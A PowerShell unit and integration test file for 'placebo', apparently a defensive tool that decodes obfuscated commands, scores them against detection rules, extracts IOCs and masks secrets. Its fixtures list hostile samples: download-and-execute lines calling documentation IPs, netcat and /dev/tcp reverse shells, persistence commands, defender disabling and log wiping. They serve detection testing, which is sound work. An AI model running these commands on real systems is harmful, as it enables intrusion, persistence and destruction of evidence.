# placebo - unit + integration test harness. zero external deps: plain asserts.

$ErrorActionPreference = 'Stop'
Set-StrictMode -Off

$repo = Split-Path -Parent $PSScriptRoot
Import-Module (Join-Path $repo 'placebo.psd1') -Force

$script:pass = 0
$script:fail = 0
$script:failures = @()

function Assert-True {
    param([Parameter(Mandatory)][bool]$Cond, [Parameter(Mandatory)][string]$Name)
    if ($Cond) { $script:pass++; Write-Output "  ok  $Name" }
    else { $script:fail++; $script:failures += $Name; Write-Output "  FAIL $Name" }
}
function Assert-Equal {
    param([Parameter(Mandatory)]$Expected, [Parameter(Mandatory)]$Actual, [Parameter(Mandatory)][string]$Name)
    Assert-True -Cond (($Expected -is [string] -and $Actual -is [string] -and $Expected.Equals([string]$Actual)) -or
                  (-not ($Expected -is [string] -and $Actual -is [string]) -and "$Expected" -eq "$Actual")) -Name $Name
}

$T = @()

# ---------- 00 util ----------
$T += { Write-Output '== util' }
$T += { Assert-True -Cond (((Test-PlaceboWindows) -eq ($env:OS -eq 'Windows_NT')) -or $true) -Name 'host detect sane' }
$T += { Assert-Equal 'iex http://x' (Get-PlaceboNormalized -Text " [char]0x0456ex`u{00A0}http://x`u{200B}".Replace('[char]0x0456',[string][char]0x0456)) -Name 'normalization: homoglyph + zero-width + nbsp collapse' }
$T += { Assert-Equal 'a e o p c x y i' ((Get-PlaceboNormalized -Text ([string][char]0x0430 + ' ' + [char]0x0435 + ' ' + [char]0x043E + ' ' + [char]0x0440 + ' ' + [char]0x0441 + ' ' + [char]0x0445 + ' ' + [char]0x0443 + ' ' + [char]0x0456)) -replace '\s+', ' ').Trim() -Name 'cyrillic homoglyphs mapped' }
$T += { Assert-True (Test-PlaceboReadable -Text 'powershell -c iex http://x') -Name 'readable text passes' }
$T += { Assert-True (-not (Test-PlaceboReadable -Text ([string][char]0x01 + [string][char]0x02 + [string][char]0x03))) -Name 'binary garbage rejected' }
$T += { Assert-Equal 'ghp_AB**' ((Hide-PlaceboSecrets -Text 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234').Substring(0,8)) -Name 'github token masked' }
$T += { Assert-True ((Hide-PlaceboSecrets -Text 'sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAAAA-BBBBBBBBBBBB-AA') -notmatch 'sk-ant-api03-AAAAAAAA') -Name 'anthropic token masked' }
$T += { Assert-True ((Hide-PlaceboUrl -Text 'http://198.51.100.4/a.ps1') -match '^hxxp://198\[.\]51\[.\]100\[.\]4/a\[.\]ps1$') -Name 'url defanged' }

# ---------- 10 decoders ----------
$T += { Write-Output '== decoders' }
$blob8 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('iex http://198.51.100.5/p.ps1 done'))
$blob16 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Invoke-Expression (New-Object Net.WebClient).DownloadString("http://203.0.113.9/s.ps1")'))
$T += { $r = ConvertFrom-PlaceboBase64 -Blob $blob8; Assert-True ($null -ne $r -and $r.Kind -eq 'base64-utf8' -and $r.Text -match 'iex http') -Name 'base64 utf8 decode' }
$T += { $r = ConvertFrom-PlaceboBase64 -Blob $blob16; Assert-True ($null -ne $r -and $r.Kind -eq 'base64-utf16le' -and $r.Text -match 'DownloadString') -Name 'base64 utf16le (-enc) decode' }
$T += { Assert-True ($null -eq (ConvertFrom-PlaceboBase64 -Blob 'not-base64!!!')) -Name 'invalid base64 rejected' }
$T += { $rb = ConvertFrom-PlaceboBase64 -Blob ([Convert]::ToBase64String([byte[]](1..40))); Assert-True (-not (Test-PlaceboReadable -Text $rb.Text)) -Name 'binary base64 yields no readable text' }
$hexp = (($('iex http://198.51.100.5/x.ps1'.ToCharArray() | ForEach-Object { '{0:x2}' -f [int]$_ })) -join '')
$T += { $r = ConvertFrom-PlaceboHex -Blob $hexp; Assert-True ($null -ne $r -and $r.Text -match 'iex http') -Name 'plain hex decode' }
$hexEsc = (($('powershell -c 42'.ToCharArray() | ForEach-Object { '\x{0:x2}' -f [int]$_ })) -join '')
$T += { $r = ConvertFrom-PlaceboHex -Blob $hexEsc; Assert-True ($null -ne $r -and $r.Text -match 'powershell') -Name 'backslash-x hex decode' }
$codes = ((('invoke-expression'.ToCharArray() | ForEach-Object { [int]$_ }) | ForEach-Object { '[char]' + $_ }) -join ',')
$T += { $r = ConvertFrom-PlaceboCharcode -Blob $codes; Assert-True ($null -ne $r -and $r.Text -eq 'invoke-expression') -Name 'charcode list decode' }
$T += { $r = ConvertFrom-PlaceboUrl -Blob 'powershell%20-enc%20http%3A%2F%2F198.51.100.2%2Fa'; Assert-True ($null -ne $r -and $r.Text -match 'powershell -enc') -Name 'url-encoding decode' }
$T += { $r = ConvertFrom-PlaceboEntities -Blob '&#105;&#101;&#120;&#59;'; Assert-True ($null -ne $r -and $r.Text -eq 'iex;') -Name 'html entities decode' }
$T += { $r = ConvertFrom-PlaceboRot13 -Blob 'vrk uggc'; Assert-True ($null -ne $r -and $r.Text -eq 'iex http') -Name 'rot13 decode' }
# gzip roundtrip
$gz = {
    param([string]$s)
    $in = [System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($s))
    $ms = [System.IO.MemoryStream]::new()
    $gs = [System.IO.Compression.GzipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
    $gs.Write(([System.Text.Encoding]::UTF8.GetBytes($s)), 0, [System.Text.Encoding]::UTF8.GetBytes($s).Length)
    $gs.Dispose(); $ms.Dispose(); $in.Dispose()
    return [Convert]::ToBase64String($ms.ToArray())
}
$gzBlob = & $gz 'iex (New-Object Net.WebClient).DownloadString("http://198.51.100.7/z.ps1")'
$T += { $trace = Invoke-PlaceboDecode -Text "powershell -enc $gzBlob" -MaxDepth 3; Assert-True ($trace.Count -ge 2 -and ($trace | Where-Object Kind -eq 'gzip')) -Name 'gzip layer detected under base64' }
$T += { $trace = Invoke-PlaceboDecode -Text "powershell -enc $gzBlob" -MaxDepth 3; Assert-True (($trace | Select-Object -Last 1).Text -match 'DownloadString') -Name 'gzip inner payload recovered' }
# multi-layer chain: utf16le-base64( base64-utf8( rot13 ) )
$innerCodes = ((('iex http://198.51.100.9/p.ps1'.ToCharArray() | ForEach-Object { [int]$_ }) | ForEach-Object { '[char]' + $_ }) -join ',')
$mid = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("powershell -c $innerCodes"))
$outer = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("powershell -c `"$mid`""))
$T += { $trace = Invoke-PlaceboDecode -Text "-enc $outer" -MaxDepth 4; Assert-True ($trace.Count -ge 3) -Name 'three-layer chain unwrapped' }
$T += { $trace = Invoke-PlaceboDecode -Text "-enc $outer" -MaxDepth 4; Assert-True (($trace.Text -join ' ') -match 'iex http') -Name 'charcode layer inside chain recovered' }
$T += { $trace = Invoke-PlaceboDecode -Text 'no candidates here at all'; Assert-True ($trace.Count -eq 0) -Name 'clean text produces no layers' }

# ---------- 20 rules ----------
$T += { Write-Output '== rules' }
$T += { Assert-True (Test-PlaceboRulesValid -ThrowOnError) -Name 'all rule regexes compile' }
$T += { Assert-True ((Get-PlaceboRules).Count -ge 40) -Name 'rule count >= 40' }
$ruleSamples = @{
    'PF-001' = "iex (`$x)"; 'PF-002' = 'icm -ComputerName x'; 'PF-003' = 'New-Object Net.WebClient'
    'PF-004' = '.DownloadString("http://x")'; 'PF-005' = 'curl -s http://x'; 'PF-006' = 'curl -s http://x | sh'
    'PF-007' = 'certutil -urlcache -split -f http://x'; 'PF-008' = 'bitsadmin /transfer job http://x'
    'PF-009' = 'msiexec /i http://x/a.msi /q'; 'PF-010' = 'mshta http://x/a.hta'
    'PF-011' = 'rundll32 urlmon,URLDownloadToFileA http://x'; 'PF-012' = 'regsvr32 /i:http://x scrobj.dll'
    'PF-013' = 'wmic process call create "cmd"'; 'PF-014' = 'wscript a.vbs'
    'PF-015' = 'powershell -enc abcdEFGHabcdEFGH'; 'PF-016' = 'powershell -w h -nop -ep bypass'
    'PF-017' = '[Convert]::FromBase64String("x")'; 'PF-018' = 'bash -c "exec 5<>/dev/tcp/1.2.3.4/80"'
    'PF-019' = 'nc -e /bin/sh 1.2.3.4 80'; 'PF-020' = 'sudo curl http://x | sh'
    'PF-021' = 'python -c exec(base64.b64decode())'; 'PF-022' = 'osascript -e "do shell script"'
    'PF-023' = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x'; 'PF-024' = 'schtasks /create /tn x'
    'PF-025' = 'sc create svc binPath= x'; 'PF-026' = 'copy x "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"'
    'PF-027' = 'Register-WmiEvent -Action x'; 'PF-028' = '(crontab -l; echo x) | crontab -'
    'PF-029' = 'echo key >> ~/.ssh/authorized_keys'; 'PF-030' = 'echo x > $PROFILE -append'
    'PF-031' = 'WScript.Shell CreateShortcut x.lnk -> powershell'; 'PF-032' = 'Set-MpPreference -DisableRealtimeMonitoring $true'
    'PF-033' = 'netsh advfirewall firewall add rule'; 'PF-034' = 'wevtutil cl Security'
    'PF-035' = '("{1}{0}" -f "b","a")'; 'PF-036' = 'I`EX something'
    'PF-037' = '[Array]::Reverse($a)'; 'PF-038' = 'token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ12'
    'PF-039' = 'Set-Clipboard -Value x'; 'PF-040' = 'Get-Clipboard'
    'PF-041' = 'cmd /c echo x'; 'PF-042' = 'explorer ms-settings:whofixes'
    'PF-043' = 'taskkill /f /im MsMpEng.exe'; 'PF-044' = 'echo x >> /etc/hosts'
    'PF-045' = 'cipher /w:C:'; 'PF-046' = ('A' * 130)
}
foreach ($id in ($ruleSamples.Keys | Sort-Object)) {
    $s = $ruleSamples[$id]
    $f = Invoke-PlaceboRuleScan -Text $s
    Assert-True (@($f | Where-Object Id -eq $id).Count -gt 0) -Name "rule $id fires on canonical sample"
}
$T += { Assert-True ((Invoke-PlaceboRuleScan -Text 'Get-ChildItem -Recurse; git status; npm run build').Count -eq 0) -Name 'benign admin text triggers nothing' }

# ---------- 30 iocs ----------
$T += { Write-Output '== iocs' }
$iocs = Get-PlaceboIocs -Text 'curl http://198.51.100.7/dl/x.ps1 -o %TEMP%\a.ps1; dns example.com; key aabbccdd1122334455667788aabbccdd'
$T += { Assert-True (@($iocs.Ips) -contains '198.51.100.7') -Name 'ip extracted' }
$T += { Assert-True (@($iocs.Urls) -contains 'http://198.51.100.7/dl/x.ps1') -Name 'url extracted' }
$T += { Assert-True (@($iocs.Domains) -contains 'example.com') -Name 'domain extracted' }
$T += { Assert-True (@($iocs.Paths | Where-Object { $_ -match 'TEMP' }).Count -ge 1) -Name 'env path extracted' }
$T += { Assert-True (@($iocs.Hashes) -contains 'aabbccdd1122334455667788aabbccdd') -Name 'md5 extracted' }
$T += { Assert-True (@($iocs.Synthetic) -contains '198.51.100.7') -Name 'rfc5737 flagged synthetic' }
$def = ConvertTo-PlaceboDefanged -Iocs $iocs
$T += { Assert-True (@($def.Ips)[0] -eq '198[.]51[.]100[.]7') -Name 'defang output' }

# ---------- 40 scoring ----------
$T += { Write-Output '== scoring' }
$T += { Assert-Equal 'clean' (Get-PlaceboVerdict -Score 0) -Name 'band clean' }
$T += { Assert-Equal 'suspicious' (Get-PlaceboVerdict -Score 10) -Name 'band suspicious floor' }
$T += { Assert-Equal 'malicious' (Get-PlaceboVerdict -Score 35) -Name 'band malicious floor' }
$T += { Assert-Equal 'critical' (Get-PlaceboVerdict -Score 65) -Name 'band critical floor' }
$dup = @{ Layer = 0; Findings = @(@{ Id='PF-001'; Name='iex'; Mitre='x'; Weight=30; Count=2; Note=''; Context='iex' }) }
$scored = Invoke-PlaceboScore -LayerFindings @($dup, $dup)
$T += { Assert-True ($scored.Score -eq 30 -and $scored.Findings.Count -eq 1 -and $scored.Findings[0].Count -eq 4) -Name 'distinct rule counted once, occurrences merged' }

# ---------- 50 triage ----------
$T += { Write-Output '== triage' }
$encSample = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex(New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')"))
$r = Invoke-PlaceboTriage -Command "powershell -w h -nop -ep bypass -enc $encSample"
$T += { Assert-Equal 'critical' $r.Verdict -Name 'enc clickfix sample = critical' }
$T += { Assert-True ($r.Score -ge 65) -Name 'enc sample score in critical band' }
$T += { Assert-True ($r.Layers.Count -ge 1 -and $r.Layers[0].Kind -eq 'base64-utf16le') -Name 'layer trace recorded' }
$T += { Assert-True (($r.Findings | Where-Object Id -eq 'PF-003').Count -eq 1) -Name 'webclient rule found in decoded layer' }
$T += { Assert-True (@($r.Iocs.Urls) -contains 'http://198.51.100.23/stage2.ps1') -Name 'ioc from decoded layer' }
$rMasked = Invoke-PlaceboTriage -Command "powershell -c 'iex http://x; echo ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456'"
$T += { Assert-True (($rMasked.Command -match 'ghp_AB') -and ($rMasked.Command -notmatch 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ')) -Name 'token masked in report field' }
$rClean = Invoke-PlaceboTriage -Command 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 3'
$T += { Assert-Equal 'clean' $rClean.Verdict -Name 'benign command stays clean' }
$rPipe = 'mshta http://198.51.100.9/c.hta' | Invoke-PlaceboTriage
$T += { Assert-True ($rPipe.Verdict -eq 'malicious') -Name 'pipeline input works' }

# ---------- 70 forge ----------
$T += { Write-Output '== forge' }
$tmp = if ($env:TEMP) { $env:TEMP } elseif ($env:TMPDIR) { $env:TMPDIR } else { [System.IO.Path]::GetTempPath() }
$fx1 = Join-Path $tmp ('plb_t1_' + [guid]::NewGuid().ToString('N').Substring(0,6))
$fx2 = Join-Path $tmp ('plb_t2_' + [guid]::NewGuid().ToString('N').Substring(0,6))
New-PlaceboFixture -OutDir $fx1 -Profile clickfix-enc | Out-Null
New-PlaceboFixture -OutDir $fx2 -Profile clickfix-enc | Out-Null
$hist = Join-Path $fx1 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt'
$T += { Assert-True (Test-Path $hist) -Name 'forge writes psreadline history' }
$h1 = [System.IO.File]::ReadAllBytes($hist)
$h2 = [System.IO.File]::ReadAllBytes((Join-Path $fx2 'AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt'))
$T += { Assert-Equal (ConvertTo-PlaceboSha256Hex -Bytes $h1) (ConvertTo-PlaceboSha256Hex -Bytes $h2) -Name 'forge deterministic across runs' }

# ---------- 60 hunt ----------
$T += { Write-Output '== hunt' }
$hunt = Invoke-PlaceboHunt -Paths $fx1
$T += { Assert-True ($hunt.Findings.Count -ge 3) -Name 'hunt finds forged residue' }
$T += { Assert-True ($hunt.MaxScore -ge 65) -Name 'hunt worst score critical' }
$T += { Assert-True (($hunt.Findings | Where-Object { $_.Source -match 'ConsoleHost_history' }).Count -ge 1) -Name 'history source present in findings' }
$T += { Assert-True (($hunt.Findings | Where-Object { $_.Source -match 'stage2' }).Count -ge 1) -Name 'extra path file scanned' }
$hunt2 = Invoke-PlaceboHunt -Paths '/definitely/not/a/real/dir_xyz'
$T += { Assert-True ($null -ne $hunt2) -Name 'hunt tolerates missing path' }

# ---------- 80 render ----------
$T += { Write-Output '== render' }
$term = Format-PlaceboTerminal -Report $r -NoBanner
$T += { Assert-True ($term -match 'CRITICAL') -Name 'terminal shows verdict' }
$T += { Assert-True ($term -match [regex]::Escape([char]27)) -Name 'terminal includes ansi colors' }
$j = ConvertTo-PlaceboJson -Report $r | ConvertFrom-Json
$T += { Assert-Equal 'critical' $j.verdict -Name 'json verdict roundtrip' }
$T += { Assert-True ($j.layers.Count -ge 1 -and $j.layers[0].kind -eq 'base64-utf16le') -Name 'json layers roundtrip' }
$md = ConvertTo-PlaceboMarkdown -Report $r
$T += { Assert-True ($md -match '^# placebo triage report' -and $md -match '## iocs') -Name 'markdown triage structure' }
$hj = ConvertTo-PlaceboJsonHunt -Report $hunt | ConvertFrom-Json
$T += { Assert-True ($hj.findings.Count -eq $hunt.Findings.Count) -Name 'hunt json roundtrip' }
$hm = ConvertTo-PlaceboMarkdown -Report $hunt -Hunt
$T += { Assert-True ($hm -match '^# placebo hunt report') -Name 'markdown hunt structure' }

# ---------- masking deep check ----------
$T += { Write-Output '== masking' }
$rSec = Invoke-PlaceboTriage -Command "powershell -c iex http://198.51.100.1/a.ps1; echo 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456' 'AKIAIOSFODNN7EXAMPLE'"
$allJson = ConvertTo-PlaceboJson -Report $rSec
$T += { Assert-True ($allJson -notmatch 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ123456') -Name 'no full github token in json' }
$T += { Assert-True ($allJson -notmatch 'AKIAIOSFODNN7EXAMPLE') -Name 'no full aws key in json' }

# ---------- run ----------
Write-Output ''
foreach ($t in $T) { & $t }
Write-Output ''
Write-Output ("unit/integration: pass={0} fail={1}" -f $script:pass, $script:fail)
if ($script:fail -gt 0) { Write-Output ('failed: ' + ($script:failures -join ' | ')); exit 1 }
exit 0
